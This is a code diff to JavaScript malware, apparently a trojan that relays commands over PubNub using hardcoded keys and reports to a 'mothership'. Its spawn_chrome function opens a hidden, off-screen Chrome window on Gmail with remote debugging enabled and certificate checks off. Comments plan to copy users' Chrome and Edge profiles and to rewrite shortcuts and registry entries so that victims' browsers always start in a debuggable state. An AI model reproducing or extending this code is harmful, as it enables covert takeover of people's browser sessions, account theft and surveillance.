@@ -1,4 +1,3 @@
-
 class PubnubRelay {
     static PUBLISH_KEY = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc";
     static SUBSCRIBE_KEY = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd";
@@ -157,7 +156,9 @@ function runpsrelay(pubnubo) {
 
     child.stdin.on("error", (err) => {
         if (err.code === "EPIPE") {
-            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+            helper.logmsg(
+                "Subprocess closed stdin early; ignoring broken pipe."
+            );
         } else {
             helper.logmsg("Unexpected STDIN error:", err);
         }
@@ -173,7 +174,7 @@ function runpsrelay(pubnubo) {
 
     helper.logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-        JSON.stringify(child.spawnargs)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -227,7 +228,9 @@ function runnoderelay(pubnubo) {
 
     child.stdin.on("error", (err) => {
         if (err.code === "EPIPE") {
-            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+            helper.logmsg(
+                "Subprocess closed stdin early; ignoring broken pipe."
+            );
         } else {
             helper.logmsg("Unexpected STDIN error:", err);
         }
@@ -243,7 +246,7 @@ function runnoderelay(pubnubo) {
 
     helper.logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-        JSON.stringify(child.spawnargs)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -290,7 +293,9 @@ function runbatrelay(pubnubo) {
 
     child.stdin.on("error", (err) => {
         if (err.code === "EPIPE") {
-            helper.logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+            helper.logmsg(
+                "Subprocess closed stdin early; ignoring broken pipe."
+            );
         } else {
             helper.logmsg("Unexpected STDIN error:", err);
         }
@@ -307,7 +312,7 @@ function runbatrelay(pubnubo) {
 
     helper.logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-        JSON.stringify(child.spawnargs)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -336,13 +341,14 @@ function launchrelay(tenginename, tpubnubr, browsername) {
     return tchildp;
 }
 
+function spawn_chrome(
+    starturl = "https://www.gmail.com/",
+    debugport = 9223,
+    datadir = null
+) {
+    datadir = datadir || path.join(systemconfig.trojandir, "chrome");
 
-// anchor
-function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {
-
-    datadir = datadir || path.join(systemconfig.trojandir, 'chrome');
-
-    let cmdlineargs = [ 
+    let cmdlineargs = [
         `--remote-debugging-port=${debugport}`,
         `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
@@ -354,23 +360,20 @@ function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir
         `--restore-last-session`,
         `--ignore-certificate-errors`,
         `--window-position=2000,2000`,
-        `--window-size=10,10`
+        `--window-size=10,10`,
     ];
 
     // TODO auto discover by reading chrome lnk files
-    let chrome_exe_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+    let chrome_exe_path =
+        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
 
-    const child = spawn(
-        chrome_exe_path,
-        [ ...cmdlineargs ],
-        {
-            // detached: true, // might cause errors
-            windowsHide: true,
-            // stdio: ["ignore", out, err],
-            // shell: false,
-            // cwd: systemconfig.trojandir,
-        }
-    );
+    const child = spawn(chrome_exe_path, [...cmdlineargs], {
+        // detached: true, // might cause errors
+        windowsHide: true,
+        // stdio: ["ignore", out, err],
+        // shell: false,
+        // cwd: systemconfig.trojandir,
+    });
 
     child.stdout.on("data", (data) => {
         let text = data.toString();
@@ -444,12 +447,10 @@ function chrome_cmdlineargs(
 
 // TODO
 async function __setup_chrome_relay() {
-
     // 1. modify shotfut lnk file in taskbar, start menu, and desktop
     // 2. modify registry paths as needed (doesn't work on TPL for that specific path)
     // 3. robocopy user data dir
     // 4. execute curl test
-
     // chrome rdp mods
     // robocopy "C:\Users\sebas\AppData\Local\Google\Chrome\User Data" C:\ProgramData\owd\chrome /E /R:0 /W:0
     // "C:\Program Files\Google\Chrome\Application\chrome.exe" --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=9223
@@ -462,7 +463,6 @@ async function __setup_chrome_relay() {
     //    Get-ItemProperty -Path "HKCU:\Software\Classes\ChromeHTML\shell\open\command" --> returned empty
     //    Get-ItemProperty -Path "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
     // ! was not able to modify reg using reg cmd or powershell -- attempt using VBScript
-
     /*
     (default)    : "C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument %1
     PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open\command
@@ -471,7 +471,6 @@ async function __setup_chrome_relay() {
     PSDrive      : HKLM
     PSProvider   : Microsoft.PowerShell.Core\Registry
     */
-
     // msedge rdp mods
     // robocopy "C:\Users\sebas\AppData\Local\Microsoft\Edge\User Data" C:\ProgramData\owd\msedge /E /W:0
     // msedge.exe --remote-debugging-port=9222 --user-data-dir="C:\ProgramData\owd\msedge"
@@ -486,20 +485,16 @@ async function __setup_chrome_relay() {
     // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
     // taskkill /F /IM msedge.exe
     // start "" /min "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default --remote-allow-origins=* --restore-last-session --user-data-dir="C:\ProgramData\owd\msedge"
-
     // shortcut folders
     // %AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
     // %ProgramData%\Microsoft\Windows\Start Menu\Programs
     // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
-
     // Desktop Shortcut:             C:\Users\<YourUsername>\Desktop
     // Start Menu:                   C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
     // Taskbar Pinned Items:         C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
     // Chrome App/Website Shortcuts: C:\Users\<YourUsername>\AppData\Local\Google\Chrome\User Data\Default\Web Applications
-
     // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
     // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice
-
     // curl -v -G http://localhost:9223/json
     // curl -s http://localhost:9223/json/list | findstr webSocketDebuggerUrl | findstr ws://
 }
